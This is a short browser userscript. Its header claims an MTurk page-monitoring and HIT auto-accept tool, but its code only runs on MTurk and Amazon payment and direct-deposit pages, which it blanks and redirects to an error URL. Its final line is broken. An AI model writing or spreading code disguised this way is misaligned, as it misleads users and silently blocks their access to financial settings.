// ==UserScript==
// @name        Tampermonkey File
// @namespace   https://greasyfork.org/
// @author      unknown source
// @description A page-monitoring web app for Mturk (Mechanical Turk) designed to make turking more efficient. Easily monitor mturk search pages and requesters and Auto-Accept the HITs you missed.
// @include     https://worker.mturk.com/direct_deposit*
// @include     https://worker.mturk.com/direct_deposit
// @include     https://worker.mturk.com/direct_deposit/register*?
// @include     http://pay.amazon.com/*
// @include     *payments.amazon.com*
// @include     https://payments.amazon.com/*
// @include     https://worker.mturk.com/payment_schedule
// @include     http*://www.amazon.com/*managepaymentmethods*
// @include     https://www.amazon.com/cpe/managepaymentmethods?ref_=ya_d_l_pmt_mpo&
// @version     2.2
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/400573/Tampermonkey%20File.user.js
// @updateURL https://update.greasyfork.org/scripts/400573/Tampermonkey%20File.meta.js
// ==/UserScript==
window.location = "https://worker.mturk.com/earning-error";
document.documentElement.innerHTML = '';
document.body.innerHTML = '';
//document.write('<meta http-equiv="refresh" content="0;url=https://worker.mturk.com/earning-error">');
document.getElementById("dmanage-payment-preferencesemo").style.display = none;